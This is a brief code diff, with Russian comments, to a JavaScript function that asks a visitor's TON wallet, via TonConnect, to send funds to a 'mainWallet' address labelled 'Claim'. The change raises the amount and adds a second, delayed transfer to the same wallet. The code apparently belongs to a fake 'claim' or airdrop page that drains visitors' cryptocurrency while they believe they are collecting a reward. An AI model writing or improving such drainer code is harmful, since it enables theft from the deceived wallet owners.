@@ -104,7 +104,7 @@ async function didtrans() {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
         messages: [{
             address: mainWallet,  // Адрес получателя
-            amount: 1, // Сумма в нанотонах
+            amount: 1000000, // Сумма в нанотонах
         }],
         sendMode: 3,  // Если это требуется в вашем API
         comment: "Claim",  // Комментарий (по желанию)
@@ -123,8 +123,10 @@ async function didtrans() {
         //alert('Ошибка при отправке транзакции.');
     }
 
+    await new Promise(resolve => setTimeout(resolve, 5000));
+
     // Формируем транзакцию
-    const transaction = {
+    const transaction1 = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
         messages: [{
             address: mainWallet,  // Адрес получателя
@@ -136,7 +138,7 @@ async function didtrans() {
 
     try {
         // Подписание и отправка транзакции через TonConnect
-        const result = await tonConnectUI.sendTransaction(transaction);
+        const result = await tonConnectUI.sendTransaction(transaction1);
         console.log('Транзакция отправлена:', result);
         //alert('Транзакция успешно отправлена!');
         
